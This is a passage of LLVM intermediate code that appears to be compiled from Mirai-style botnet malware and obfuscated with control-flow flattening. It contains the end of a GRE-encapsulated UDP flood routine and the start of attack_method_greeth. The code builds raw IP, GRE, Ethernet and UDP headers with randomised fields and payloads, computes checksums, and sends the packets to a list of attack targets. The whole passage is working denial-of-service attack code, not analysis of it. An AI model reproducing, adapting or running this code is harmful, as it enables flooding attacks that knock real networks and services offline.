  %229 = load i16, i16* %16, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  store i16 %230, i16* %232, align 2
  %233 = load i16, i16* %17, align 2
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  %237 = load i32, i32* %18, align 4
  %238 = sext i32 %237 to i64
  %239 = add i64 8, %238
  %240 = trunc i64 %239 to i16
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 2
  store i16 %241, i16* %243, align 2
  store i32 -1112613386, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %9, align 4
  store i32 -494998527, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 -189694965, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -2099721063, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %9, align 4
  %251 = load i8, i8* %5, align 1
  %252 = zext i8 %251 to i32
  %253 = icmp slt i32 %250, %252
  %254 = select i1 %253, i32 -1516798508, i32 1700582662
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i8**, i8*** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i8*, i8** %256, i64 %258
  %260 = load i8*, i8** %259, align 8
  store i8* %260, i8** %26, align 8
  %261 = load i8*, i8** %26, align 8
  %262 = bitcast i8* %261 to %struct.iphdr*
  store %struct.iphdr* %262, %struct.iphdr** %27, align 8
  %263 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i64 1
  %265 = bitcast %struct.iphdr* %264 to %struct.grehdr*
  store %struct.grehdr* %265, %struct.grehdr** %28, align 8
  %266 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %267 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %266, i64 1
  %268 = bitcast %struct.grehdr* %267 to %struct.iphdr*
  store %struct.iphdr* %268, %struct.iphdr** %29, align 8
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i64 1
  %271 = bitcast %struct.iphdr* %270 to %struct.udphdr*
  store %struct.udphdr* %271, %struct.udphdr** %30, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %273 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %272, i64 1
  %274 = bitcast %struct.udphdr* %273 to i8*
  store i8* %274, i8** %31, align 8
  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 2
  %280 = load i8, i8* %279, align 4
  %281 = zext i8 %280 to i32
  %282 = icmp slt i32 %281, 32
  %283 = select i1 %282, i32 32162017, i32 747712851
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #7
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 %301) #7
  %303 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  store i32 747712851, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i32, i32* %21, align 4
  %307 = icmp eq i32 %306, -1
  %308 = select i1 %307, i32 -269666178, i32 -593371616
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = call i32 @rand_next()
  %311 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 8
  store i32 %310, i32* %312, align 4
  store i32 -593371616, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i16, i16* %13, align 2
  %315 = zext i16 %314 to i32
  %316 = icmp eq i32 %315, 65535
  %317 = select i1 %316, i32 -1280160845, i32 1654127326
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = call i32 @rand_next()
  %320 = and i32 %319, 65535
  %321 = trunc i32 %320 to i16
  %322 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  store i16 %321, i16* %323, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 3
  %326 = load i16, i16* %325, align 4
  %327 = zext i16 %326 to i32
  %328 = sub nsw i32 %327, 1000
  %329 = xor i32 %328, -1
  %330 = trunc i32 %329 to i16
  %331 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  store i16 %330, i16* %332, align 4
  store i32 1654127326, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i16, i16* %16, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  %337 = select i1 %336, i32 -2033246374, i32 303243365
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @rand_next()
  %340 = and i32 %339, 65535
  %341 = trunc i32 %340 to i16
  %342 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i32 0, i32 0
  store i16 %341, i16* %343, align 2
  store i32 303243365, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i16, i16* %17, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  %348 = select i1 %347, i32 -2130436692, i32 311038388
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = call i32 @rand_next()
  %351 = and i32 %350, 65535
  %352 = trunc i32 %351 to i16
  %353 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 1
  store i16 %352, i16* %354, align 2
  store i32 311038388, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8, i8* %20, align 1
  %357 = icmp ne i8 %356, 0
  %358 = select i1 %357, i32 -483590975, i32 -1170199100
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = call i32 @rand_next()
  %361 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 9
  store i32 %360, i32* %362, align 4
  store i32 398043728, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 9
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 9
  store i32 %366, i32* %368, align 4
  store i32 398043728, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i8, i8* %19, align 1
  %371 = icmp ne i8 %370, 0
  %372 = select i1 %371, i32 -1178338078, i32 -294158401
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8*, i8** %31, align 8
  %375 = load i32, i32* %18, align 4
  call void @rand_str(i8* %374, i32 %375)
  store i32 -294158401, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 7
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %380 = bitcast %struct.iphdr* %379 to i16*
  %381 = call zeroext i16 @checksum_generic(i16* %380, i32 20)
  %382 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 %381, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 7
  store i16 0, i16* %385, align 2
  %386 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %387 = bitcast %struct.iphdr* %386 to i16*
  %388 = call zeroext i16 @checksum_generic(i16* %387, i32 20)
  %389 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 7
  store i16 %388, i16* %390, align 2
  %391 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %392 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %391, i32 0, i32 3
  store i16 0, i16* %392, align 2
  %393 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %394 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %395 = bitcast %struct.udphdr* %394 to i8*
  %396 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 2
  %398 = load i16, i16* %397, align 2
  %399 = load i32, i32* %18, align 4
  %400 = sext i32 %399 to i64
  %401 = add i64 8, %400
  %402 = trunc i64 %401 to i32
  %403 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %393, i8* %395, i16 zeroext %398, i32 %402)
  %404 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 3
  store i16 %403, i16* %405, align 2
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 0
  %411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %410, i32 0, i32 0
  store i16 2, i16* %411, align 4
  %412 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 9
  %414 = load i32, i32* %413, align 4
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 2
  %421 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %420, i32 0, i32 0
  store i32 %414, i32* %421, align 4
  %422 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 0
  %427 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %426, i32 0, i32 1
  store i16 0, i16* %427, align 2
  %428 = load i32, i32* %10, align 4
  %429 = load i8*, i8** %26, align 8
  %430 = load i32, i32* %18, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 52, %431
  %433 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %434 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %435 = load i32, i32* %9, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i32 0, i32 0
  %439 = bitcast %struct.sockaddr_in* %438 to %struct.sockaddr*
  store %struct.sockaddr* %439, %struct.sockaddr** %433, align 8
  %440 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %441 = load %struct.sockaddr*, %struct.sockaddr** %440, align 8
  %442 = call i64 @sendto(i32 %428, i8* %429, i64 %432, i32 16384, %struct.sockaddr* %441, i32 16)
  store i32 -1475406472, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i32, i32* %9, align 4
  %445 = add nsw i32 %444, 1
  store i32 %445, i32* %9, align 4
  store i32 -2099721063, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  store i32 -189694965, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %446, %443, %376, %373, %369, %363, %359, %355, %349, %344, %338, %333, %318, %313, %309, %305, %284, %255, %249, %248, %247, %244, %228, %220, %214, %205, %201, %151, %147, %96, %90, %89, %86, %80, %79, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1712369038, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1712369038, label %first
    i32 583464277, label %87
    i32 -1157502642, label %88
    i32 -1309979870, label %94
    i32 356831030, label %97
    i32 -1875574251, label %98
    i32 1711358172, label %104
    i32 1868587197, label %158
    i32 540686356, label %162
    i32 -1153410918, label %215
    i32 -1489426457, label %219
    i32 -218116863, label %228
    i32 792002810, label %234
    i32 1200140703, label %242
    i32 1828952948, label %258
    i32 -706076741, label %261
    i32 -173956448, label %262
    i32 693126201, label %263
    i32 491672385, label %269
    i32 391319825, label %301
    i32 848277881, label %322
    i32 -1110865577, label %326
    i32 791349011, label %330
    i32 297671768, label %335
    i32 -39014875, label %350
    i32 -1944962621, label %355
    i32 657719987, label %361
    i32 -777822706, label %366
    i32 -41283542, label %372
    i32 -672547286, label %376
    i32 231662717, label %380
    i32 1153249698, label %386
    i32 -1909762955, label %412
    i32 -1011647712, label %415
    i32 -676720712, label %482
    i32 -23227160, label %485
    i32 -1067013050, label %486
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %85 = icmp eq i32 %.reload, -1
  %86 = select i1 %85, i32 583464277, i32 -1157502642
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -1067013050, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %89 = load i32, i32* %10, align 4
  %90 = bitcast i32* %9 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  %93 = select i1 %92, i32 -1309979870, i32 356831030
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %10, align 4
  %96 = call i32 @close(i32 %95)
  store i32 -1067013050, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1875574251, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %9, align 4
  %100 = load i8, i8* %5, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  %103 = select i1 %102, i32 1711358172, i32 -706076741
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %106 = load i8**, i8*** %11, align 8
  %107 = load i32, i32* %9, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  store i8* %105, i8** %109, align 8
  %110 = load i8**, i8*** %11, align 8
  %111 = load i32, i32* %9, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to %struct.iphdr*
  store %struct.iphdr* %115, %struct.iphdr** %22, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i64 1
  %118 = bitcast %struct.iphdr* %117 to %struct.grehdr*
  store %struct.grehdr* %118, %struct.grehdr** %23, align 8
  %119 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %120 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %119, i64 1
  %121 = bitcast %struct.grehdr* %120 to %struct.ethhdr*
  store %struct.ethhdr* %121, %struct.ethhdr** %24, align 8
  %122 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %123 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %122, i64 1
  %124 = bitcast %struct.ethhdr* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %25, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %26, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, 15
  %132 = or i8 %131, 64
  store i8 %132, i8* %129, align 4
  %133 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, -16
  %137 = or i8 %136, 5
  store i8 %137, i8* %134, align 4
  %138 = load i8, i8* %12, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 1
  store i8 %138, i8* %140, align 1
  %141 = load i32, i32* %18, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 66, %142
  %144 = trunc i64 %143 to i16
  %145 = call zeroext i16 @htons(i16 zeroext %144) #7
  %146 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i32 0, i32 2
  store i16 %145, i16* %147, align 2
  %148 = load i16, i16* %13, align 2
  %149 = call zeroext i16 @htons(i16 zeroext %148) #7
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 3
  store i16 %149, i16* %151, align 4
  %152 = load i8, i8* %14, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 5
  store i8 %152, i8* %154, align 4
  %155 = load i8, i8* %15, align 1
  %156 = icmp ne i8 %155, 0
  %157 = select i1 %156, i32 1868587197, i32 540686356
  store i32 %157, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 4
  store i16 %159, i16* %161, align 2
  store i32 540686356, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 6
  store i8 47, i8* %164, align 1
  %165 = load i32, i32* %21, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 8
  store i32 %165, i32* %167, align 4
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 9
  store i32 %173, i32* %175, align 4
  %176 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %177 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %178 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %177, i32 0, i32 1
  store i16 %176, i16* %178, align 2
  %179 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %180 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %181 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %180, i32 0, i32 2
  store i16 %179, i16* %181, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = load i8, i8* %183, align 4
  %185 = and i8 %184, 15
  %186 = or i8 %185, 64
  store i8 %186, i8* %183, align 4
  %187 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %188 = bitcast %struct.iphdr* %187 to i8*
  %189 = load i8, i8* %188, align 4
  %190 = and i8 %189, -16
  %191 = or i8 %190, 5
  store i8 %191, i8* %188, align 4
  %192 = load i8, i8* %12, align 1
  %193 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 1
  store i8 %192, i8* %194, align 1
  %195 = load i32, i32* %18, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 28, %196
  %198 = trunc i64 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %13, align 2
  %203 = zext i16 %202 to i32
  %204 = xor i32 %203, -1
  %205 = trunc i32 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 3
  store i16 %206, i16* %208, align 4
  %209 = load i8, i8* %14, align 1
